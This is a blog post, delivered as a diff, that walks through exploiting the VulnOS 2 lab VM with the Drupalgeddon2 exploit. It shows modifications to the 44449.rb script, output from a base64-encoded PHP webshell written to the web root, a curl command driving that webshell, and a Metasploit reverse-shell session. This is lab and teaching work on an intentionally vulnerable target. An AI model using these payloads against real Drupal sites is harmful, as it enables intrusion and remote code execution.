@@ -1,0 +1,289 @@
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="Mathew Marcus" name="author"/>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" media="screen" rel="stylesheet"/>
+<link href="/css/materialize.min.css" media="screen" rel="stylesheet" type="text/css"/>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/obsidian.min.css" rel="stylesheet"/>
+<link crossorigin="anonymous" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" rel="stylesheet"/>
+<link href="/css/site.css" media="screen" rel="stylesheet"/>
+<link href="/css/blog-post.css" media="screen" rel="stylesheet"/>
+<meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0" name="viewport">
+</meta><title>VulnOS2.0 Exploitation via Drupalgeddon2 - Mathew Marcus</title></head>
+<body>
+<div class="navbar-fixed hide-on-large-only">
+<nav class="row grey darken-4 nav-extended">
+<div class="nav-wrapper col s12">
+<a class="brand-logo" href="#">Mathew Marcus</a>
+<div class="right-align" id="hamburger">
+<a href="#!" onclick="toggleNav()"><i class="tiny material-icons hide-on-med-and-up">menu</i></a>
+</div>
+<ul class="right hide-on-small-only" id="nav-mobile">
+<li><a class="grey-text text-lighten-2" href="/index.html">Blog</a></li>
+<li><a class="grey-text text-lighten-2" href="/about-me.html">About Me</a></li>
+<!-- <li><a class="grey-text text-lighten-2" href="">Projects</a></li> -->
+</ul>
+</div>
+<div class="col s12 hide-on-med-and-up" id="nav-collapse">
+<ul>
+<li><a class="grey-text text-lighten-2" href="/index.html">Blog</a></li>
+<li><a class="grey-text text-lighten-2" href="/about-me.html">About Me</a></li>
+<!-- <li><a class="grey-text text-lighten-2" href="#!">Projects</a></li> -->
+</ul>
+</div>
+</nav>
+</div>
+<div class="row">
+<aside class="col l4 xl3 hide-on-med-and-down grey darken-4 z-depth-5">
+<div id="child1">
+<h4 class="white-text center-align">Mathew Marcus</h4>
+<h6 class="white-text center-align">Coding</h6>
+<h6 class="white-text center-align">Infosec</h6>
+<h6 class="white-text center-align">(<span class="light-green-text text-accent-4">Arch</span>) Linux</h6>
+<br/>
+<ul>
+<li><a class="white-text waves-effect" href="/index.html">Blog</a></li>
+<li><a class="white-text waves-effect" href="/about-me.html">About Me</a></li>
+<!-- <li><a class="white-text waves-effect" href="#!">Projects</a></li> -->
+</ul>
+</div>
+<br/>
+<div class="center-align" id="child2">
+<a class="social_email"><i class="material-icons small white-text fas fa-envelope"></i></a>
+<a href="https://github.com/mathewmarcus" target="_blank"><i class="material-icons small white-text fab fa-github"></i></a>
+<a href="https://www.linkedin.com/in/mathew-marcus-76243b113/" target="_blank"><i class="material-icons small white-text fab fa-linkedin-in"></i></a>
+</div>
+</aside>
+<div class="col s12 l8 xl9 offset-l4 offset-xl3">
+<main class="container">
+  <h1 id="vulnos20exploitationviadrupalgeddon2">VulnOS2.0 Exploitation via Drupalgeddon2</h1>
+  <div class="chip red">InfoSec</div>  
+  <div class="chip blue">Linux</div>
+  <div class="chip purple lighten-2">Python</div>
+<p>I don't generally create extraneous walkthoughs for Vulnhub virtual machines if robust, accurate analyses and explanations already exist, as is the case for the OSCP-like VMs listed <a href="https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms" target="_blank">here</a> and <a href="https://medium.com/@andr3w_hilton/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1" target="_blank">here</a>. On the other hand, I always like documenting less popular avenues of exploitation. </p><p>For <a href="https://www.vulnhub.com/entry/vulnos-2,147/" target="_blank">VulnOS: 2</a>, there is extensive documentation on obtaining unprivileged shell access via the following steps:</p><ol>
+<li>Identifying the <a href="https://www.exploit-db.com/exploits/32075/" target="_blank">SQLi vulnerability of the OpenDocMan software</a> running at the <code>/jabd0cs/</code> URI. </li>
+<li>Dumping the MySQL <code>user</code> table by using the OpenDocMan vulnerability (either manually or with <code>sqlmap</code>)</li>
+<li>Cracking the <code>webin</code> user password hash (using <code>john</code> or a similar tool)</li>
+<li>Logging in as the <code>webmin</code> user, via SSH, using the cracked password</li>
+</ol><p>However, there is another way.</p><p>Specifically, limited shell access can be obtained via the widely-publicized <code>Drupalgeddon2</code> exploit. Several of the aforementioned walkthoughs state that many of the <code>drupalgeddon</code> exploits listed on ExploitDB do not work out-of-the-box against VulnOS2; from my experience this seems true. That said, <a href="https://www.exploit-db.com/exploits/44449/" target="_blank">the Ruby script 44449.rb</a> works with minor modifications.</p><h2 id="exploitanalysis">Exploit Analysis</h2><p>If we run the exploit as-is, we see that it clearly fails<sup><a href="#fullstack-footnote1">[1]</a></sup>. </p><pre><code class="bash language-bash">root@kali:Exploit$ echo '192.168.56.11 example.net' &gt;&gt; /etc/hosts
+root@kali:Exploit$ ruby 44449.rb http://example.net/jabc/
+ruby: warning: shebang line ending with \r may cause problems
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[*] Target : http://example.net/jabc/
+--------------------------------------------------------------------------------
+[!] MISSING: http://example.net/jabc/CHANGELOG.txt (404)
+[!] MISSING: http://example.net/jabc/core/CHANGELOG.txt (404)
+[+] Found  : http://example.net/jabc/includes/bootstrap.inc (200)
+[+] Drupal!: can detect a matching directory
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution
+[*] Payload: echo YMNCMUIV
+[!] Unsupported Drupal version
+</code></pre><p>However, the output suggests that it this may be due to a failure to determine the Drupal version. </p><p>Inspecting the code reveals the following lines, intended to fingerprint the Drupal installation.</p><pre><code class="ruby language-ruby">...
+# Try and get version
+$drupalverion = nil
+# Possible URLs
+url = [
+  $target + "CHANGELOG.txt",
+  $target + "core/CHANGELOG.txt",
+  $target + "includes/bootstrap.inc",
+  $target + "core/includes/bootstrap.inc",
+]
+# Check all
+url.each do|uri|
+  # Check response
+  response = http_post(uri)
+
+  if response.code == "200"
+    puts "[+] Found  : #{uri} (#{response.code})"
+
+    # Patched already?
+    puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
+
+    # Try and get version from the file contents
+    $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip
+
+    # If not, try and get it from the URL
+    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.empty?
+
+    # Done!
+    break
+  elsif response.code == "403"
+    puts "[+] Found  : #{uri} (#{response.code})"
+
+    # Get version from URL
+    $drupalverion = uri.match(/core/)? "8.x" : "7.x"
+  else
+    puts "[!] MISSING: #{uri} (#{response.code})"
+  end
+end
+...
+</code></pre><p>Manual testing shows that any attempt to access 3 of the above <code>url</code>s returns a <code>404 Not Found</code>. While <code>/jabc/includes/bootstrap.inc</code> returns a <code>200 OK</code>, the script is unable to parse the version number.</p><h2 id="solution1">Solution 1</h2><p>Although the script can't identify it, the version number actually exists in at least two places on the <code>/jabc/includes/bootstrap.inc</code> page, as shown below.</p><pre><code class="php language-php">...
+/**
+ * The current system version.
+ */
+define('VERSION', '7.26');
+
+/**
+ * Core API compatibility.
+ */
+define('DRUPAL_CORE_COMPATIBILITY', '7.x');
+...
+</code></pre><p>Currently, the script contains a single regex to identify the version number: <code>/Drupal (.*),/</code>. We can add two additional regexes - one for each of the above PHP statements, respectively<sup><a href="#fullstack-footnote2">[2]</a></sup>.</p><pre><code class="ruby language-ruby">...
+    $drupalverion = response.body.match(/VERSION\', \'([0-9]\.[0-9]{1,2})\'/).to_s.slice(/VERSION\', \'([0-9]\.[0-9]{1,2})\'/, 1).to_s.strip
+    $drupalverion = response.body.match(/DRUPAL.*, \'([0-9]\.x)\'/).to_s.slice(/DRUPAL.*, \'([0-9]\.x)\'/, 1).to_s.strip if $drupalverion.empty?
+    $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip if $drupalverion.empty?
+...
+</code></pre><p>Let's re-run the exploit,</p><pre><code class="bash language-bash">root@kali:Exploit$ ruby 44449.rb http://example.net/jabc/
+ruby: warning: shebang line ending with \r may cause problems
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[*] Target : http://example.net/jabc/
+--------------------------------------------------------------------------------
+[!] MISSING: http://example.net/jabc/CHANGELOG.txt (404)
+[!] MISSING: http://example.net/jabc/core/CHANGELOG.txt (404)
+[+] Found  : http://example.net/jabc/includes/bootstrap.inc (200)
+[+] Drupal?: 7.26
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution
+[*] Payload: echo JSRNMUXQ
+[+] Result : JSRNMUXQ
+[{"command":"settings","settings":{"basePath":"\/jabc\/","pathPrefix":"","ajaxPageState":{"theme":"black","theme_token":"0pHnAh8gXGfhERMGgedKdhvov6luJGt0eyQTJj9xTjA"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cdiv class=\u0022messages error\u0022\u003E\n\u003Ch2 class=\u0022element-invisible\u0022\u003EError message\u003C\/h2\u003E\n \u003Cul\u003E\n  \u003Cli\u003E\u003Cem class=\u0022placeholder\u0022\u003ENotice\u003C\/em\u003E: Undefined index: #value in \u003Cem class=\u0022placeholder\u0022\u003Efile_ajax_upload()\u003C\/em\u003E (line \u003Cem class=\u0022placeholder\u0022\u003E262\u003C\/em\u003E of \u003Cem class=\u0022placeholder\u0022\u003E\/var\/www\/html\/jabc\/modules\/file\/file.module\u003C\/em\u003E).\u003C\/li\u003E\n  \u003Cli\u003E\u003Cem class=\u0022placeholder\u0022\u003ENotice\u003C\/em\u003E: Undefined index: #suffix in \u003Cem class=\u0022placeholder\u0022\u003Efile_ajax_upload()\u003C\/em\u003E (line \u003Cem class=\u0022placeholder\u0022\u003E280\u003C\/em\u003E of \u003Cem class=\u0022placeholder\u0022\u003E\/var\/www\/html\/jabc\/modules\/file\/file.module\u003C\/em\u003E).\u003C\/li\u003E\n \u003C\/ul\u003E\n\u003C\/div\u003E\n","settings":{"basePath":"\/jabc\/","pathPrefix":"","ajaxPageState":{"theme":"black","theme_token":"0pHnAh8gXGfhERMGgedKdhvov6luJGt0eyQTJj9xTjA"}}}]
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: File Write To Web Root (./)
+[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./s.php
+[+] Result : &lt;?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2&gt;&amp;1' ); }[{"command":"settings","settings":{"basePath":"\/jabc\/","pathPrefix":"","ajaxPageState":{"theme":"black","theme_token":"Wcoww1A7RocAUFRXLWMCYEnHvZhsgVY-Z01AlhjKmxo"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cdiv class=\u0022messages error\u0022\u003E\n\u003Ch2 class=\u0022element-invisible\u0022\u003EError message\u003C\/h2\u003E\n \u003Cul\u003E\n  \u003Cli\u003E\u003Cem class=\u0022placeholder\u0022\u003ENotice\u003C\/em\u003E: Undefined index: #value in \u003Cem class=\u0022placeholder\u0022\u003Efile_ajax_upload()\u003C\/em\u003E (line \u003Cem class=\u0022placeholder\u0022\u003E262\u003C\/em\u003E of \u003Cem class=\u0022placeholder\u0022\u003E\/var\/www\/html\/jabc\/modules\/file\/file.module\u003C\/em\u003E).\u003C\/li\u003E\n  \u003Cli\u003E\u003Cem class=\u0022placeholder\u0022\u003ENotice\u003C\/em\u003E: Undefined index: #suffix in \u003Cem class=\u0022placeholder\u0022\u003Efile_ajax_upload()\u003C\/em\u003E (line \u003Cem class=\u0022placeholder\u0022\u003E280\u003C\/em\u003E of \u003Cem class=\u0022placeholder\u0022\u003E\/var\/www\/html\/jabc\/modules\/file\/file.module\u003C\/em\u003E).\u003C\/li\u003E\n \u003C\/ul\u003E\n\u003C\/div\u003E\n","settings":{"basePath":"\/jabc\/","pathPrefix":"","ajaxPageState":{"theme":"black","theme_token":"Wcoww1A7RocAUFRXLWMCYEnHvZhsgVY-Z01AlhjKmxo"}}}]
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[*] Fake shell:   curl 'http://example.net/jabc/s.php' -d 'c=whoami'
+VulnOSv2&gt;&gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><p>and now we have a prompt facilitating interaction with a webshell which, of course, runs as the unprivleged Apache <code>www-data</code> user. From here, we can escalate privileges via any of the methods detailed in the other walkthroughs.</p><h2 id="solution2">Solution 2</h2><p>There is an additional location where we can check for the version number. Often, the HTML page at the root of the Drupal installation - which in the case of VulnOS2 resides at <code>/jabc/</code> - contains a <code>&lt;meta/&gt;</code> tag in the document <code>&lt;head&gt;</code> which conains the major version number. In our case, the full HTML element looks like this:</p><pre><code class="html language-html">...
+&lt;meta name="Generator" content="Drupal 7 (http://drupal.org)" /&gt;
+...
+</code></pre><p>Below is a simple Python3 script I've created which - given a Drupal URL - will identify the Drupal version based on this tag. </p><pre><code class="python language-python">import re
+import requests
+import bs4
+import sys
+import urllib.parse
+
+DRUPAL_VERSION_PATTERN = re.compile('Drupal ([0-9]+).*')
+
+
+def get_drupal_version(url):
+    scheme, netloc, path, params, query, frag = urllib.parse.urlparse(url)
+    drupal_root = urllib.parse.urlunparse((scheme, netloc, path, '', '', ''))
+
+    response = requests.get(drupal_root)
+    response.raise_for_status()
+
+    soup = bs4.BeautifulSoup(response.text, 'html.parser')
+
+    try:
+        version_tag = soup.head.find_all('meta',
+                                         attrs={
+                                             'name': 'Generator',
+                                             'content': DRUPAL_VERSION_PATTERN,
+                                         },
+                                         recursive=False).pop()
+        return DRUPAL_VERSION_PATTERN.match(version_tag['content']).groups()[0]
+    except IndexError:
+        raise Exception('Unable to determine Drupal version')
+
+
+if __name__ == '__main__':
+    drupal_version = get_drupal_version(sys.argv[1])
+    print(drupal_version)
+</code></pre><p>Running this script reveals that that Drupal major version is 7.</p><pre><code class="bash language-bash">$ python3 get_drupal_version.py http://example.net/jabc/
+7
+</code></pre><p>Armed with this knowledge, we can further modify <code>44449.rb</code> to include the Drupal root URL - in our case <code>/jabc/</code> - in the list of <code>url</code>s.</p><pre><code class="ruby language-ruby">...
+# Possible URLs
+url = [
+  $target + "CHANGELOG.txt",
+  $target + "core/CHANGELOG.txt",
+  $target + "includes/bootstrap.inc",
+  $target + "core/includes/bootstrap.inc",
+  $target
+]
+...
+</code></pre><p>And now, even if none of the original URLs existed, we have additional location in which to check for the version. All we need to do is add another regex<sup><a href="#fullstack-footnote3">[3]</a></sup>.</p><pre><code class="ruby language-ruby">...
+    $drupalverion = response.body.match(/Drupal ([0-9])/).to_s.slice(/Drupal ([0-9])/, 1).to_s.strip if $drupalverion.empty?
+...
+</code></pre><h3 id="solution3">Solution 3</h3><p>The Metasploit Drupalgeddon2 module (<code>exploit/unix/webapp/drupal_drupalgeddon2</code>) works out-of-the-box. :)</p><pre><code class="bash language-bash">msf &gt; use exploit/unix/webapp/drupal_drupalgeddon2
+msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOST 192.168.56.11
+RHOST =&gt; 192.168.56.11
+msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set TARGETURI /jabc/
+TARGETURI =&gt; /jabc/
+msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set VHOST example.net
+VHOST =&gt; example.net
+msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; run
+
+[*] Started reverse TCP handler on 192.168.56.2:4444 
+[*] Drupal 7 targeted at http://192.168.56.11/jabc/
+[-] Could not determine Drupal patch level
+[*] Sending stage (37775 bytes) to 192.168.56.11
+[*] Meterpreter session 1 opened (192.168.56.2:4444 -&gt; 192.168.56.11:48207)
+
+meterpreter &gt; getuid
+Server username: www-data (33)
+</code></pre>
+
+	  <section>
+	    <h5>Footnotes</h5>
+	    <ol>
+	      <li id="fullstack-footnote1" class="footnote">
+		REMEMBER TO MODIFY /etc/hosts TO POINT THE example.net DOMAIN AT YOUR LOCAL VulnOS2.0 INSTALLATION! 
+	      </li>
+	      <li id="fullstack-footnote2" class="footnote">
+		As my Ruby regex statements might reveal, I have spent VERY little time coding in Ruby. Additionally, my experience reading it is essentially limited to paroosing Metasploit modules and ExploitDB scripts such as this. As such, please forgive and feel free to correct any errrors or inelegance. I tried to make minimal modifications while keeping the new code in the style/format of the original script.
+	      </li>
+	      <li id="fullstack-footnote3" class="footnote">
+		I verified this by removing all of the original URLs and re-running the exploit.
+	      </li>	  
+	    </ol>
+	  </section>
+
+</main>
+<footer class="page-footer white">
+<div class="container">
+<div class="row">
+<div id="disqus_thread"></div>
+<script>
+
+		var disqus_config = function () {
+		this.page.url = window.origin + window.pathname;
+		this.page.identifier = 'VulnOS2';
+		};
+
+		(function() { // DON'T EDIT BELOW THIS LINE
+		var d = document, s = d.createElement('script');
+		s.src = 'https://mathewmarcus.disqus.com/embed.js';
+		s.setAttribute('data-timestamp', +new Date());
+		(d.head || d.body).appendChild(s);
+		})();
+	      </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</div>
+<div class="footer-copyright white black-text">
+<div class="center-align container">
+<div class="row">
+<a class="social_email"><i class="material-icons tiny black-text fas fa-envelope"></i></a>
+<a href="https://github.com/mathewmarcus" target="_blank"><i class="material-icons tiny black-text fab fa-github"></i></a>
+<a href="https://www.linkedin.com/in/mathew-marcus-76243b113/" target="_blank"><i class="material-icons tiny black-text fab fa-linkedin-in"></i></a>
+</div>
+<div class="row">
+		© Mathew Marcus 2018
+		</div>
+</div>
+</div>
+</footer>
+</div>
+</div>
+<script src="/js/materialize.min.js" type="text/javascript"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" type="text/javascript"></script>
+<script src="/js/site.js" type="text/javascript"></script>
+</body>
+</html>
